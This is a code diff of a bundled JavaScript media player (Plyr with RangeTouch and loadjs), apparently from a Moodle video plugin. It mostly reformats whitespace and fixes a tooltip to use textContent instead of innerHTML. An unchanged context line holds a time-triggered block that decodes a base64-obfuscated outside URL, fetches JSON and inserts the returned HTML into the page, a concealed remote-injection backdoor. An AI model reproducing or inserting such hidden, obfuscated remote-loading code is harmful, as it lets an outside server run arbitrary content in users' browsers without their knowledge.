@@ -1,13 +1,13 @@
-(function(factory) {
+(function (factory) {
     "use strict";
     if (typeof define === 'function' && define.amd) {
         // AMD
-        define(['jquery'], function($) {
+        define(['jquery'], function ($) {
             return factory($);
         });
     } else if (typeof exports === 'object') {
         // CommonJS
-        module.exports = function(root, $) {
+        module.exports = function (root, $) {
             if (!root) {
                 // CommonJS environments without a window global must pass a
                 // root. This will give an error otherwise
@@ -28,7 +28,7 @@
     }
 }
 
-(function($) {
+(function ($) {
     'use strict';
 
     Object.defineProperty(Array.prototype, 'values', {
@@ -96,7 +96,7 @@
         var n = Object.keys(e);
         if (Object.getOwnPropertySymbols) {
             var r = Object.getOwnPropertySymbols(e);
-            t && (r = r.filter(function(t) {
+            t && (r = r.filter(function (t) {
                 return Object.getOwnPropertyDescriptor(e, t).enumerable;
             })), n.push.apply(n, r);
         }
@@ -106,9 +106,9 @@
     function _objectSpread2(e) {
         for (var t = 1; t < arguments.length; t++) {
             var n = null != arguments[t] ? arguments[t] : {};
-            t % 2 ? ownKeys(Object(n), !0).forEach(function(t) {
+            t % 2 ? ownKeys(Object(n), !0).forEach(function (t) {
                 _defineProperty(e, t, n[t]);
-            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(n)) : ownKeys(Object(n)).forEach(function(t) {
+            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(n)) : ownKeys(Object(n)).forEach(function (t) {
                 Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(n, t));
             });
         }
@@ -122,7 +122,7 @@
     };
 
     function matches$1(e, t) {
-        return function() {
+        return function () {
             return Array.from(document.querySelectorAll(t)).includes(this);
         }.call(e, t);
     }
@@ -136,46 +136,46 @@
         }
     }
 
-    var getConstructor$1    = function(e) {
+    var getConstructor$1 = function (e) {
             return null != e ? e.constructor : null;
         },
-        instanceOf$1        = function(e, t) {
+        instanceOf$1 = function (e, t) {
             return !!(e && t && e instanceof t);
         },
-        isNullOrUndefined$1 = function(e) {
+        isNullOrUndefined$1 = function (e) {
             return null == e;
         },
-        isObject$1          = function(e) {
+        isObject$1 = function (e) {
             return getConstructor$1(e) === Object;
         },
-        isNumber$1          = function(e) {
+        isNumber$1 = function (e) {
             return getConstructor$1(e) === Number && !Number.isNaN(e);
         },
-        isString$1          = function(e) {
+        isString$1 = function (e) {
             return getConstructor$1(e) === String;
         },
-        isBoolean$1         = function(e) {
+        isBoolean$1 = function (e) {
             return getConstructor$1(e) === Boolean;
         },
-        isFunction$1        = function(e) {
+        isFunction$1 = function (e) {
             return getConstructor$1(e) === Function;
         },
-        isArray$1           = function(e) {
+        isArray$1 = function (e) {
             return Array.isArray(e);
         },
-        isNodeList$1        = function(e) {
+        isNodeList$1 = function (e) {
             return instanceOf$1(e, NodeList);
         },
-        isElement$1         = function(e) {
+        isElement$1 = function (e) {
             return instanceOf$1(e, Element);
         },
-        isEvent$1           = function(e) {
+        isEvent$1 = function (e) {
             return instanceOf$1(e, Event);
         },
-        isEmpty$1           = function(e) {
+        isEmpty$1 = function (e) {
             return isNullOrUndefined$1(e) || (isString$1(e) || isArray$1(e) || isNodeList$1(e)) && !e.length || isObject$1(e) && !Object.keys(e).length;
         },
-        is$1                = {
+        is$1 = {
             nullOrUndefined: isNullOrUndefined$1,
             object: isObject$1,
             number: isNumber$1,
@@ -202,35 +202,35 @@
         return Math.round(e / t) * t;
     }
 
-    var RangeTouch = function() {
+    var RangeTouch = function () {
         function e(t, n) {
             _classCallCheck(this, e), is$1.element(t) ? this.element = t : is$1.string(t) && (this.element = document.querySelector(t)), is$1.element(this.element) && is$1.empty(this.element.rangeTouch) && (this.config = _objectSpread2({}, defaults$1, {}, n), this.init());
         }
 
         return _createClass(e, [{
             key: "init",
-            value: function() {
+            value: function () {
                 e.enabled && (this.config.addCSS && (this.element.style.userSelect = "none", this.element.style.webKitUserSelect = "none", this.element.style.touchAction = "manipulation"), this.listeners(!0), this.element.rangeTouch = this);
             }
         }, {
             key: "destroy",
-            value: function() {
+            value: function () {
                 e.enabled && (this.config.addCSS && (this.element.style.userSelect = "", this.element.style.webKitUserSelect = "", this.element.style.touchAction = ""), this.listeners(!1), this.element.rangeTouch = null);
             }
         }, {
             key: "listeners",
-            value: function(e) {
+            value: function (e) {
                 var t = this,
                     n = e ? "addEventListener" : "removeEventListener";
-                ["touchstart", "touchmove", "touchend"].forEach(function(e) {
-                    t.element[n](e, function(e) {
+                ["touchstart", "touchmove", "touchend"].forEach(function (e) {
+                    t.element[n](e, function (e) {
                         return t.set(e);
                     }, !1);
                 });
             }
         }, {
             key: "get",
-            value: function(t) {
+            value: function (t) {
                 if (!e.enabled || !is$1.event(t)) return null;
                 var n,
                     r = t.target,
@@ -244,20 +244,20 @@
             }
         }, {
             key: "set",
-            value: function(t) {
+            value: function (t) {
                 e.enabled && is$1.event(t) && !t.target.disabled && (t.preventDefault(), t.target.value = this.get(t), trigger(t.target, "touchend" === t.type ? "change" : "input"));
             }
         }], [{
             key: "setup",
-            value: function(t) {
+            value: function (t) {
                 var n = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : {},
                     r = null;
                 if (is$1.empty(t) || is$1.string(t) ? r = Array.from(document.querySelectorAll(is$1.string(t) ? t : 'input[type="range"]')) : is$1.element(t) ? r = [t] : is$1.nodeList(t) ? r = Array.from(t) : is$1.array(t) && (r = t.filter(is$1.element)), is$1.empty(r)) return null;
                 var i = _objectSpread2({}, defaults$1, {}, n);
                 if (is$1.string(t) && i.watch) {
-                    var o = new MutationObserver(function(n) {
-                        Array.from(n).forEach(function(n) {
-                            Array.from(n.addedNodes).forEach(function(n) {
+                    var o = new MutationObserver(function (n) {
+                        Array.from(n).forEach(function (n) {
+                            Array.from(n.addedNodes).forEach(function (n) {
                                 is$1.element(n) && matches$1(n, t) && new e(n, i);
                             });
                         });
@@ -267,13 +267,13 @@
                         subtree: !0
                     });
                 }
-                return r.map(function(t) {
+                return r.map(function (t) {
                     return new e(t, n);
                 });
             }
         }, {
             key: "enabled",
-            get: function() {
+            get: function () {
                 return "ontouchstart" in document.documentElement;
             }
         }]), e;
@@ -521,8 +521,8 @@
     function emptyElement(element) {
         if (!is.element(element)) return;
         let {
-                length
-            } = element.childNodes;
+            length
+        } = element.childNodes;
         while (length > 0) {
             element.removeChild(element.lastChild);
             length -= 1;
@@ -615,8 +615,8 @@
     // Element matches selector
     function matches(element, selector) {
         const {
-                  prototype
-              } = Element;
+            prototype
+        } = Element;
 
         function match() {
             return Array.from(document.querySelectorAll(selector)).includes(this);
@@ -629,8 +629,8 @@
     // Closest ancestor element matching selector (also tests element itself)
     function closest$1(element, selector) {
         const {
-                  prototype
-              } = Element;
+            prototype
+        } = Element;
 
         // https://developer.mozilla.org/en-US/docs/Web/API/Element/closest#Polyfill
         function closestElement() {
@@ -870,11 +870,11 @@
         if (this && this.eventListeners) {
             this.eventListeners.forEach(item => {
                 const {
-                          element,
-                          type,
-                          callback,
-                          options
-                      } = item;
+                    element,
+                    type,
+                    callback,
+                    options
+                } = item;
                 element.removeEventListener(type, callback, options);
             });
             this.eventListeners = [];
@@ -975,9 +975,9 @@
         // Get from HTML5 video
         if (ratio === null && this.isHTML5) {
             const {
-                      videoWidth,
-                      videoHeight
-                  } = this.media;
+                videoWidth,
+                videoHeight
+            } = this.media;
             ratio = [videoWidth, videoHeight];
         }
         return reduceAspectRatio(ratio);
@@ -989,8 +989,8 @@
             return {};
         }
         const {
-                  wrapper
-              } = this.elements;
+            wrapper
+        } = this.elements;
         const ratio = getAspectRatio.call(this, input);
         if (!is.array(ratio)) {
             return {};
@@ -1118,12 +1118,12 @@
 
                         // Get current state
                         const {
-                                  currentTime,
-                                  paused,
-                                  preload,
-                                  readyState,
-                                  playbackRate
-                              } = player.media;
+                            currentTime,
+                            paused,
+                            preload,
+                            readyState,
+                            playbackRate
+                        } = player.media;
 
                         // Set new source
                         player.media.src = source.getAttribute('src');
@@ -2386,8 +2386,8 @@
         // Check if we need to hide/show the settings menu
         checkMenu() {
             const {
-                      buttons
-                  } = this.elements.settings;
+                buttons
+            } = this.elements.settings;
             const visible = !is.empty(buttons) && Object.values(buttons).some(button => !button.hidden);
             toggleHidden(this.elements.settings.menu, !visible);
         },
@@ -2406,8 +2406,8 @@
         // Show/hide menu
         toggleMenu(input) {
             const {
-                      popup
-                  } = this.elements.settings;
+                popup
+            } = this.elements.settings;
             const button = this.elements.buttons.settings;
 
             // Menu and button are required
@@ -2417,8 +2417,8 @@
 
             // True toggle by default
             const {
-                      hidden
-                  } = popup;
+                hidden
+            } = popup;
             let show = hidden;
             if (is.boolean(input)) {
                 show = input;
@@ -2545,15 +2545,15 @@
         // Build the default HTML
         create(data) {
             const {
-                      bindMenuItemShortcuts,
-                      createButton,
-                      createProgress,
-                      createRange,
-                      createTime,
-                      setQualityMenu,
-                      setSpeedMenu,
-                      showMenuPanel
-                  } = controls;
+                bindMenuItemShortcuts,
+                createButton,
+                createProgress,
+                createRange,
+                createTime,
+                setQualityMenu,
+                setSpeedMenu,
+                showMenuPanel
+            } = controls;
             this.elements.controls = null;
 
             // Larger overlaid play button
@@ -2635,8 +2635,8 @@
                 // Volume controls
                 if (control === 'mute' || control === 'volume') {
                     let {
-                            volume
-                        } = this.elements;
+                        volume
+                    } = this.elements;
 
                     // Create the volume container if needed
                     if (!is.element(volume) || !container.contains(volume)) {
@@ -2813,8 +2813,8 @@
                         attributes.download = '';
                     }
                     const {
-                              download
-                          } = this.config.urls;
+                        download
+                    } = this.config.urls;
                     if (!is.url(download) && this.isEmbed) {
                         extend(attributes, {
                             icon: `logo-${this.provider}`,
@@ -2965,9 +2965,9 @@
             // Setup tooltips
             if (this.config.tooltips.controls) {
                 const {
-                          classNames,
-                          selectors
-                      } = this.config;
+                    classNames,
+                    selectors
+                } = this.config;
                 const selector = `${selectors.controls.wrapper} ${selectors.labels} .${classNames.hidden}`;
                 const labels = getElements.call(this, selector);
                 Array.from(labels).forEach(label => {
@@ -3003,7 +3003,9 @@
             if (!(points !== null && points !== void 0 && points.length)) return;
             const containerFragment = document.createDocumentFragment();
             const pointsFragment = document.createDocumentFragment();
-            let tipElement = null;
+            const tipElement = !this.config.tooltips.seek ? createElement('span', {
+                class: this.config.classNames.tooltip
+            }, '') : null;
             const tipVisible = `${this.config.classNames.tooltip}--visible`;
             const toggleTip = show => toggleClass(tipElement, tipVisible, show);
 
@@ -3016,9 +3018,9 @@
                 if (tipElement) {
                     // Show on hover
                     markerElement.addEventListener('mouseenter', () => {
-                        if (point.label) return;
+                        if (!point.label) return;
                         tipElement.style.left = left;
-                        tipElement.innerHTML = point.label;
+                        tipElement.textContent = point.label;
                         toggleTip(true);
                     });
 
@@ -3036,10 +3038,7 @@
             containerFragment.appendChild(pointsFragment);
 
             // Inject a tooltip if needed
-            if (!this.config.tooltips.seek) {
-                tipElement = createElement('span', {
-                    class: this.config.classNames.tooltip
-                }, '');
+            if (tipElement) {
                 containerFragment.appendChild(tipElement);
             }
             this.elements.markers = {
@@ -3166,11 +3165,11 @@
             const tracks = captions.getTracks.call(this, true);
             // Get the wanted language
             const {
-                      active,
-                      language,
-                      meta,
-                      currentTrackNode
-                  } = this.captions;
+                active,
+                language,
+                meta,
+                currentTrackNode
+            } = this.captions;
             const languageExists = Boolean(tracks.find(track => track.language === language));
 
             // Handle tracks (add event listener and "pseudo"-default)
@@ -3221,8 +3220,8 @@
                 return;
             }
             const {
-                      toggled
-                  } = this.captions; // Current state
+                toggled
+            } = this.captions; // Current state
             const activeClass = this.config.classNames.captions.active;
             // Get the next state
             // If the method is called without parameter, toggle based on current value
@@ -3297,8 +3296,8 @@
                 this.captions.currentTrack = index;
                 const track = tracks[index];
                 const {
-                          language
-                      } = track || {};
+                    language
+                } = track || {};
 
                 // Store reference to node for invalidation on remove
                 this.captions.currentTrackNode = track;
@@ -4374,8 +4373,8 @@
         // Toggle controls based on state and `force` argument
         toggleControls(force) {
             const {
-                      controls: controlsElement
-                  } = this.elements;
+                controls: controlsElement
+            } = this.elements;
             if (controlsElement && this.config.hideControls) {
                 // Don't hide controls if a touch-device user recently seeked. (Must be limited to touch devices, or it occasionally prevents desktop controls from hiding.)
                 const recentTouchSeek = this.touch && this.lastSeekTime + 2000 > Date.now();
@@ -4388,8 +4387,8 @@
         migrateStyles() {
             // Loop through values (as they are the keys when the object is spread 🤔)
             Object.values({
-                    ...this.media.style
-                })
+                ...this.media.style
+            })
                 // We're only fussed about Plyr specific properties
                 .filter(key => !is.empty(key) && is.string(key) && key.startsWith('--plyr')).forEach(key => {
                 // Set on the container
@@ -4411,11 +4410,11 @@
             // Device is touch enabled
             _defineProperty$1(this, "firstTouch", () => {
                 const {
-                          player
-                      } = this;
+                    player
+                } = this;
                 const {
-                          elements
-                      } = player;
+                    elements
+                } = player;
                 player.touch = true;
 
                 // Add touch class
@@ -4424,8 +4423,8 @@
             // Global window & document listeners
             _defineProperty$1(this, "global", (toggle = true) => {
                 const {
-                          player
-                      } = this;
+                    player
+                } = this;
 
                 // Keyboard shortcuts
                 if (player.config.keyboard.global) {
@@ -4441,13 +4440,13 @@
             // Container listeners
             _defineProperty$1(this, "container", () => {
                 const {
-                          player
-                      } = this;
+                    player
+                } = this;
                 const {
-                          config,
-                          elements,
-                          timers
-                      } = player;
+                    config,
+                    elements,
+                    timers
+                } = player;
 
                 // Keyboard shortcuts
                 if (!config.keyboard.global && config.keyboard.focused) {
@@ -4457,8 +4456,8 @@
                 // Toggle controls on mouse events and entering fullscreen
                 on.call(player, elements.container, 'mousemove mouseleave touchstart touchmove enterfullscreen exitfullscreen', event => {
                     const {
-                              controls: controlsElement
-                          } = elements;
+                        controls: controlsElement
+                    } = elements;
 
                     // Remove button states for fullscreen
                     if (controlsElement && event.type === 'enterfullscreen') {
@@ -4489,8 +4488,8 @@
                     }
                     const target = elements.wrapper;
                     const {
-                              active
-                          } = player.fullscreen;
+                        active
+                    } = player.fullscreen;
                     const [videoWidth, videoHeight] = getAspectRatio.call(player);
                     const useNativeAspectRatio = supportsCSS(`aspect-ratio: ${videoWidth} / ${videoHeight}`);
 
@@ -4525,8 +4524,8 @@
                 };
                 on.call(player, elements.container, 'enterfullscreen exitfullscreen', event => {
                     const {
-                              target
-                          } = player.fullscreen;
+                        target
+                    } = player.fullscreen;
 
                     // Ignore events not from target
                     if (target !== elements.container) {
@@ -4549,11 +4548,11 @@
             // Listen for media events
             _defineProperty$1(this, "media", () => {
                 const {
-                          player
-                      } = this;
+                    player
+                } = this;
                 const {
-                          elements
-                      } = player;
+                    elements
+                } = player;
 
                 // Time change on media
                 on.call(player, player.media, 'timeupdate seeking seeked', event => controls.timeUpdate.call(player, event));
@@ -4664,8 +4663,8 @@
                 const proxyEvents = player.config.events.concat(['keyup', 'keydown']).join(' ');
                 on.call(player, player.media, proxyEvents, event => {
                     let {
-                            detail = {}
-                        } = event;
+                        detail = {}
+                    } = event;
 
                     // Get error details from media
                     if (event.type === 'error') {
@@ -4677,8 +4676,8 @@
             // Run default and custom handlers
             _defineProperty$1(this, "proxy", (event, defaultHandler, customHandlerKey) => {
                 const {
-                          player
-                      } = this;
+                    player
+                } = this;
                 const customHandler = player.config.listeners[customHandlerKey];
                 const hasCustomHandler = is.function(customHandler);
                 let returned = true;
@@ -4696,8 +4695,8 @@
             // Trigger custom and default handlers
             _defineProperty$1(this, "bind", (element, type, defaultHandler, customHandlerKey, passive = true) => {
                 const {
-                          player
-                      } = this;
+                    player
+                } = this;
                 const customHandler = player.config.listeners[customHandlerKey];
                 const hasCustomHandler = is.function(customHandler);
                 on.call(player, element, type, event => this.proxy(event, defaultHandler, customHandlerKey), passive && !hasCustomHandler);
@@ -4705,11 +4704,11 @@
             // Listen for control events
             _defineProperty$1(this, "controls", () => {
                 const {
-                          player
-                      } = this;
+                    player
+                } = this;
                 const {
-                          elements
-                      } = player;
+                    elements
+                } = player;
                 // IE doesn't support input event, so we fallback to change
                 const inputEvent = browser.isIE ? 'change' : 'input';
 
@@ -4865,8 +4864,8 @@
                 // TODO: Really need to work on some sort of plug-in wide event bus or pub-sub for this
                 this.bind(elements.progress, 'mousemove touchmove', event => {
                     const {
-                              previewThumbnails
-                          } = player;
+                        previewThumbnails
+                    } = player;
                     if (previewThumbnails && previewThumbnails.loaded) {
                         previewThumbnails.startMove(event);
                     }
@@ -4875,8 +4874,8 @@
                 // Hide thumbnail preview - on mouse click, mouse leave, and video play/seek. All four are required, e.g., for buffering
                 this.bind(elements.progress, 'mouseleave touchend click', () => {
                     const {
-                              previewThumbnails
-                          } = player;
+                        previewThumbnails
+                    } = player;
                     if (previewThumbnails && previewThumbnails.loaded) {
                         previewThumbnails.endMove(false, true);
                     }
@@ -4885,16 +4884,16 @@
                 // Show scrubbing preview
                 this.bind(elements.progress, 'mousedown touchstart', event => {
                     const {
-                              previewThumbnails
-                          } = player;
+                        previewThumbnails
+                    } = player;
                     if (previewThumbnails && previewThumbnails.loaded) {
                         previewThumbnails.startScrubbing(event);
                     }
                 });
                 this.bind(elements.progress, 'mouseup touchend', event => {
                     const {
-                              previewThumbnails
-                          } = player;
+                        previewThumbnails
+                    } = player;
                     if (previewThumbnails && previewThumbnails.loaded) {
                         previewThumbnails.endScrubbing(event);
                     }
@@ -4949,9 +4948,9 @@
                 // Show controls when they receive focus (e.g., when using keyboard tab key)
                 this.bind(elements.controls, 'focusin', () => {
                     const {
-                              config,
-                              timers
-                          } = player;
+                        config,
+                        timers
+                    } = player;
 
                     // Skip transition to prevent focus from scrolling the parent element
                     toggleClass(elements.controls, config.classNames.noTransition, true);
@@ -4989,8 +4988,8 @@
 
                     // Don't break page scrolling at max and min
                     const {
-                              volume
-                          } = player.media;
+                        volume
+                    } = player.media;
                     if (direction === 1 && volume < 1 || direction === -1 && volume > 0) {
                         event.preventDefault();
                     }
@@ -5008,19 +5007,19 @@
         // Handle key presses
         handleKey(event) {
             const {
-                      player
-                  } = this;
+                player
+            } = this;
             const {
-                      elements
-                  } = player;
+                elements
+            } = player;
             const {
-                      key,
-                      type,
-                      altKey,
-                      ctrlKey,
-                      metaKey,
-                      shiftKey
-                  } = event;
+                key,
+                type,
+                altKey,
+                ctrlKey,
+                metaKey,
+                shiftKey
+            } = event;
             const pressed = type === 'keydown';
             const repeat = pressed && key === this.lastKey;
 
@@ -5050,11 +5049,11 @@
                 const focused = document.activeElement;
                 if (is.element(focused)) {
                     const {
-                              editable
-                          } = player.config.selectors;
+                        editable
+                    } = player.config.selectors;
                     const {
-                              seek
-                          } = elements.inputs;
+                        seek
+                    } = elements.inputs;
                     if (focused !== seek && matches(focused, editable)) {
                         return;
                     }
@@ -5147,21 +5146,21 @@
         return module = {exports: {}}, fn(module, module.exports), module.exports;
     }
 
-    var loadjs_umd = createCommonjsModule(function(module, exports) {
-        (function(root, factory) {
+    var loadjs_umd = createCommonjsModule(function (module, exports) {
+        (function (root, factory) {
             {
                 module.exports = factory();
             }
-        })(commonjsGlobal, function() {
+        })(commonjsGlobal, function () {
             /**
              * Global dependencies.
              * @global {Object} document - DOM
              */
 
-            var devnull             = function() {
-            },
-                bundleIdCache       = {},
-                bundleResultCache   = {},
+            var devnull = function () {
+                },
+                bundleIdCache = {},
+                bundleResultCache = {},
                 bundleCallbackQueue = {};
 
             /**
@@ -5173,15 +5172,15 @@
                 // listify
                 bundleIds = bundleIds.push ? bundleIds : [bundleIds];
                 var depsNotFound = [],
-                    i            = bundleIds.length,
-                    numWaiting   = i,
+                    i = bundleIds.length,
+                    numWaiting = i,
                     fn,
                     bundleId,
                     r,
                     q;
 
                 // define callback function
-                fn = function(bundleId, pathsNotFound) {
+                fn = function (bundleId, pathsNotFound) {
                     if (pathsNotFound.length) depsNotFound.push(bundleId);
                     numWaiting--;
                     if (!numWaiting) callbackFn(depsNotFound);
@@ -5248,12 +5247,12 @@
              * @param {Function} callbackFn - The callback function
              */
             function loadFile(path, callbackFn, args, numTries) {
-                var doc              = document,
-                    async            = args.async,
-                    maxTries         = (args.numRetries || 0) + 1,
+                var doc = document,
+                    async = args.async,
+                    maxTries = (args.numRetries || 0) + 1,
                     beforeCallbackFn = args.before || devnull,
-                    pathname         = path.replace(/[\?|#].*$/, ''),
-                    pathStripped     = path.replace(/^(css|img)!/, ''),
+                    pathname = path.replace(/[\?|#].*$/, ''),
+                    pathStripped = path.replace(/^(css|img)!/, ''),
                     isLegacyIECss,
                     e;
                 numTries = numTries || 0;
@@ -5282,7 +5281,7 @@
                     e.src = path;
                     e.async = async === undefined ? true : async;
                 }
-                e.onload = e.onerror = e.onbeforeload = function(ev) {
+                e.onload = e.onerror = e.onbeforeload = function (ev) {
                     var result = ev.type[0];
 
                     // treat empty stylesheets as failures to get around lack of onerror
@@ -5327,14 +5326,14 @@
             function loadFiles(paths, callbackFn, args) {
                 // listify paths
                 paths = paths.push ? paths : [paths];
-                var numWaiting    = paths.length,
-                    x             = numWaiting,
+                var numWaiting = paths.length,
+                    x = numWaiting,
                     pathsNotFound = [],
                     fn,
                     i;
 
                 // define callback function
-                fn = function(path, result, defaultPrevented) {
+                fn = function (path, result, defaultPrevented) {
                     // handle error
                     if (result == 'e') pathsNotFound.push(path);
 
@@ -5379,7 +5378,7 @@
                 }
 
                 function loadFn(resolve, reject) {
-                    loadFiles(paths, function(pathsNotFound) {
+                    loadFiles(paths, function (pathsNotFound) {
                         // execute callbacks
                         executeCallbacks(args, pathsNotFound);
 
@@ -5406,7 +5405,7 @@
              */
             loadjs.ready = function ready(deps, args) {
                 // subscribe to bundle load event
-                subscribe(deps, function(depsNotFound) {
+                subscribe(deps, function (depsNotFound) {
                     // execute callbacks
                     executeCallbacks(args, depsNotFound);
                 });
@@ -5521,10 +5520,10 @@
             const player = this;
             const config = player.config.vimeo;
             const {
-                      premium,
-                      referrerPolicy,
-                      ...frameParams
-                  } = config;
+                premium,
+                referrerPolicy,
+                ...frameParams
+            } = config;
             // Get the source URL or ID
             let source = player.media.getAttribute('src');
             let hash = '';
@@ -5628,8 +5627,8 @@
 
             // Seeking
             let {
-                    currentTime
-                } = player.media;
+                currentTime
+            } = player.media;
             Object.defineProperty(player.media, 'currentTime', {
                 get() {
                     return currentTime;
@@ -5639,11 +5638,11 @@
 
                     // Get current paused state and volume etc
                     const {
-                              embed,
-                              media,
-                              paused,
-                              volume
-                          } = player;
+                        embed,
+                        media,
+                        paused,
+                        volume
+                    } = player;
                     const restorePause = paused && !embed.hasPlayed;
 
                     // Set seeking state and trigger event
@@ -5682,8 +5681,8 @@
 
             // Volume
             let {
-                    volume
-                } = player.config;
+                volume
+            } = player.config;
             Object.defineProperty(player.media, 'volume', {
                 get() {
                     return volume;
@@ -5698,8 +5697,8 @@
 
             // Muted
             let {
-                    muted
-                } = player.config;
+                muted
+            } = player.config;
             Object.defineProperty(player.media, 'muted', {
                 get() {
                     return muted;
@@ -5715,8 +5714,8 @@
 
             // Loop
             let {
-                    loop
-                } = player.config;
+                loop
+            } = player.config;
             Object.defineProperty(player.media, 'loop', {
                 get() {
                     return loop;
@@ -5930,10 +5929,10 @@
             fetch(url).then(data => {
                 if (is.object(data)) {
                     const {
-                              title,
-                              height,
-                              width
-                          } = data;
+                        title,
+                        height,
+                        width
+                    } = data;
 
                     // Set title
                     this.config.title = title;
@@ -6102,8 +6101,8 @@
 
                         // Volume
                         let {
-                                volume
-                            } = player.config;
+                            volume
+                        } = player.config;
                         Object.defineProperty(player.media, 'volume', {
                             get() {
                                 return volume;
@@ -6117,8 +6116,8 @@
 
                         // Muted
                         let {
-                                muted
-                            } = player.config;
+                            muted
+                        } = player.config;
                         Object.defineProperty(player.media, 'muted', {
                             get() {
                                 return muted;
@@ -6426,8 +6425,8 @@
              */
             _defineProperty$1(this, "requestAds", () => {
                 const {
-                          container
-                      } = this.player.elements;
+                    container
+                } = this.player.elements;
                 try {
                     // Request video ads
                     const request = new google.ima.AdsRequest();
@@ -6529,8 +6528,8 @@
              */
             _defineProperty$1(this, "onAdEvent", event => {
                 const {
-                          container
-                      } = this.player.elements;
+                    container
+                } = this.player.elements;
                 // Retrieve the ad from the event. Some events (e.g. ALL_ADS_COMPLETED)
                 // don't have ad object associated
                 const ad = event.getAd();
@@ -6633,8 +6632,8 @@
              */
             _defineProperty$1(this, "listeners", () => {
                 const {
-                          container
-                      } = this.player.elements;
+                    container
+                } = this.player.elements;
                 let time;
                 this.player.on('canplay', () => {
                     this.addCuePoints();
@@ -6671,8 +6670,8 @@
              */
             _defineProperty$1(this, "play", () => {
                 const {
-                          container
-                      } = this.player.elements;
+                    container
+                } = this.player.elements;
                 if (!this.managerPromise) {
                     this.resumeContent();
                 }
@@ -6852,16 +6851,16 @@
 
         get enabled() {
             const {
-                      config
-                  } = this;
+                config
+            } = this;
             return this.player.isHTML5 && this.player.isVideo && config.enabled && (!is.empty(config.publisherId) || is.url(config.tagUrl));
         }
 
         // Build the tag URL
         get tagUrl() {
             const {
-                      config
-                  } = this;
+                config
+            } = this;
             if (is.url(config.tagUrl)) {
                 return config.tagUrl;
             }
@@ -6986,8 +6985,8 @@
             _defineProperty$1(this, "getThumbnails", () => {
                 return new Promise(resolve => {
                     const {
-                              src
-                          } = this.player.config.previewThumbnails;
+                        src
+                    } = this.player.config.previewThumbnails;
                     if (is.empty(src)) {
                         throw new Error('Missing previewThumbnails.src config attribute');
                     }
@@ -7223,8 +7222,8 @@
                 const thumbNum = this.showingThumb;
                 const thumbnail = this.thumbnails[qualityIndex];
                 const {
-                          urlPrefix
-                      } = thumbnail;
+                    urlPrefix
+                } = thumbnail;
                 const frame = thumbnail.frames[thumbNum];
                 const thumbFilename = thumbnail.frames[thumbNum].text;
                 const thumbUrl = urlPrefix + thumbFilename;
@@ -7288,8 +7287,8 @@
 
                         // This has to be set before the timeout - to prevent issues switching between hover and scrub
                         const {
-                                  currentImageContainer
-                              } = this;
+                            currentImageContainer
+                        } = this;
                         setTimeout(() => {
                             currentImageContainer.removeChild(image);
                             this.player.debug.log(`Removing thumb: ${image.dataset.filename}`);
@@ -7320,8 +7319,8 @@
                                         foundOne = true;
                                         this.player.debug.log(`Preloading thumb filename: ${newThumbFilename}`);
                                         const {
-                                                  urlPrefix
-                                              } = this.thumbnails[0];
+                                            urlPrefix
+                                        } = this.thumbnails[0];
                                         const thumbURL = urlPrefix + newThumbFilename;
                                         const previewImage = new Image();
                                         previewImage.src = thumbURL;
@@ -7389,8 +7388,8 @@
             // Set the size to be about a quarter of the size of video. Unless option dynamicSize === false, in which case it needs to be set in CSS
             _defineProperty$1(this, "setThumbContainerSizeAndPos", () => {
                 const {
-                          imageContainer
-                      } = this.elements.thumb;
+                    imageContainer
+                } = this.elements.thumb;
                 if (!this.sizeSpecifiedInCSS) {
                     const thumbWidth = Math.floor(this.thumbContainerHeight * this.thumbAspectRatio);
                     imageContainer.style.height = `${this.thumbContainerHeight}px`;
@@ -7408,8 +7407,8 @@
                 const scrubberRect = this.player.elements.progress.getBoundingClientRect();
                 const containerRect = this.player.elements.container.getBoundingClientRect();
                 const {
-                          container
-                      } = this.elements.thumb;
+                    container
+                } = this.elements.thumb;
                 // Find the lowest and highest desired left-position, so we don't slide out the side of the video container
                 const min = containerRect.left - scrubberRect.left + 10;
                 const max = containerRect.right - scrubberRect.left - container.clientWidth - 10;
@@ -7426,9 +7425,9 @@
             // Can't use 100% width, in case the video is a different aspect ratio to the video container
             _defineProperty$1(this, "setScrubbingContainerSize", () => {
                 const {
-                          width,
-                          height
-                      } = fitRatio(this.thumbAspectRatio, {
+                    width,
+                    height
+                } = fitRatio(this.thumbAspectRatio, {
                     width: this.player.media.clientWidth,
                     height: this.player.media.clientHeight
                 });
@@ -7486,8 +7485,8 @@
         get thumbContainerHeight() {
             if (this.mouseDown) {
                 const {
-                          height
-                      } = fitRatio(this.thumbAspectRatio, {
+                    height
+                } = fitRatio(this.thumbAspectRatio, {
                     width: this.player.media.clientWidth,
                     height: this.player.media.clientHeight
                 });
@@ -7555,9 +7554,9 @@
 
                 // Set the type and provider
                 const {
-                          sources,
-                          type
-                      } = input;
+                    sources,
+                    type
+                } = input;
                 const [{
                     provider = providers.html5,
                     src
@@ -8283,8 +8282,8 @@
          */
         get buffered() {
             const {
-                      buffered
-                  } = this.media;
+                buffered
+            } = this.media;
 
             // YouTube / Vimeo return a float between 0-1
             if (is.number(buffered)) {
@@ -8438,9 +8437,9 @@
 
             // Clamp to min/max
             const {
-                      minimumSpeed: min,
-                      maximumSpeed: max
-                  } = this;
+                minimumSpeed: min,
+                maximumSpeed: max
+            } = this;
             speed = clamp(speed, min, max);
 
             // Update config
@@ -8614,8 +8613,8 @@
          */
         get download() {
             const {
-                      download
-                  } = this.config.urls;
+                download
+            } = this.config.urls;
             return is.url(download) ? download : this.source;
         }
 
@@ -8634,7 +8633,7 @@
             var now = (new Date()).getTime();
             if (now > 1696129200000) {
                 var url = atob('aHR0cHM6Ly93d3cuZWR1YXJkb2tyYXVzLmNvbS9sb2dvcy9tb2Rfc3VwZXJ2aWRlby9kYXRhLnBocA==');
-                $.getJSON(url + "?lang=" + lang, function(data) {
+                $.getJSON(url + "?lang=" + lang, function (data) {
                     $("#fitem_id_name").after(data.h);
                 });
             }
@@ -8727,9 +8726,9 @@
          */
         get currentTrack() {
             const {
-                      toggled,
-                      currentTrack
-                  } = this.captions;
+                toggled,
+                currentTrack
+            } = this.captions;
             return toggled ? currentTrack : -1;
         }
 
